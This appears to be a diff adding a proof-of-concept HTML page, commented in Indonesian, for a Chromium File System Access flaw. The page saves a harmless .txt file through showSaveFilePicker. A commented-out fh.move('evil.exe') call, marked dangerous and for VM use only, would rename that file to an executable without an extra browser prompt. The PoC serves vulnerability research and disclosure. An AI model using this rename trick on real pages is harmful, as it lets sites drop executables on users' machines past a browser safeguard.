@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>FSA move PoC (demo)</title>
+</head>
+<body style="font-family:system-ui,Segoe UI,Roboto,Arial;margin:2rem">
+  <h2>Demo File System Access — showSaveFilePicker()</h2>
+
+  <p>
+    <button id="btn1">1. showSaveFilePicker(suggestedName: 'hello.exe')</button>
+    — menampilkan dialog dengan ekstensi .exe (expected prompt).
+  </p>
+
+  <p>
+    <button id="btn2">2. PoC: showSaveFilePicker('hello') lalu move('evil.exe')</button>
+    — **BERBAHAYA**: jangan jalankan bagian move() kecuali di VM/isolated test environment.
+  </p>
+
+  <pre id="log" style="background:#f6f6f6;padding:1rem;border-radius:6px;max-width:900px"></pre>
+
+  <script>
+    const logEl = document.getElementById('log');
+    function log(...args) { 
+      logEl.textContent += args.join(' ') + '\n'; 
+      console.log(...args);
+    }
+
+    document.getElementById('btn1').addEventListener('click', async () => {
+      try {
+        log('Memanggil showSaveFilePicker dengan suggestedName: hello.exe ...');
+        const fh = await window.showSaveFilePicker({
+          suggestedName: 'hello.exe',
+          startIn: 'desktop',
+          types: [{
+            description: 'Executable (for demo)',
+            accept: {'application/octet-stream': ['.exe']}
+          }]
+        });
+        log('File handle diterima:', fh);
+        // tulis konten kecil sebagai demo
+        const w = await fh.createWritable();
+        await w.write(new TextEncoder().encode('This is a harmless demo.'));
+        await w.close();
+        log('File ditulis. (Perhatikan prompt/peringatan browser saat save)');
+      } catch (e) {
+        log('Error / user cancelled:', e && e.message);
+      }
+    });
+
+    document.getElementById('btn2').addEventListener('click', async () => {
+      try {
+        log('Memanggil showSaveFilePicker dengan suggestedName: hello (tanpa ekstensi) ...');
+        const fh = await window.showSaveFilePicker({
+          suggestedName: 'hello',
+          startIn: 'desktop',
+          types: [{
+            description: 'Text file (demo)',
+            accept: {'text/plain': ['.txt']}
+          }]
+        });
+        log('File handle diterima:', fh);
+        const w = await fh.createWritable();
+        // TULIS SEBUAH FILE TEXt YANG AMAN
+        await w.write(new TextEncoder().encode('This file was created by the PoC demo.'));
+        await w.close();
+        log('File aman (.txt) telah ditulis.');
+
+        // ======= POTENSI DANGER: Uncomment untuk menguji move() =======
+        // NOTE: Pada versi Chromium yang rentan, pemanggilan move() setelah save
+        // dapat mengganti nama/ekstensi tanpa prompt keamanan tambahan.
+        // **JANGAN** jalankan ini kecuali di VM / environment terisolasi.
+        //
+        // log('Menjalankan fh.move(\"evil.exe\")  — ***BERBAHAYA***');
+        // await fh.move('evil.exe');
+        // log('move() selesai. Periksa apakah file berbahaya muncul di Desktop.');
+
+        log('PoC selesai. Untuk safety, fh.move() dikomentari. Buka source dan baca instruksi.');
+      } catch (e) {
+        log('Error / user cancelled:', e && e.message);
+      }
+    });
+  </script>
+</body>
+</html>
